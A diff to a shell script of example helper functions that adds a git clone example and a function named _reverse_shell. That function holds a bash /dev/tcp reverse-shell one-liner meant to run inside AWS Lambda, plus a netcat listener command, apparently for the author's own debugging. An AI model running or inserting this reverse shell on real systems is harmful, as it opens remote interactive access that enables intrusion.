@@ -47,3 +47,17 @@ _jsonlint_example(){
 _query_athena_example(){
   query "select 1+1 as hello_athena"
 }
+
+_git_example(){
+  git clone https://github.com/skilbjo/markets-etl.git
+
+  ls markets-etl
+}
+
+_reverse_shell(){
+  # run this in lambda
+  bash -i >& /dev/tcp/$ip/$port 0>&1
+
+  # run this locally
+  # nc -l -p $port -vvv
+}
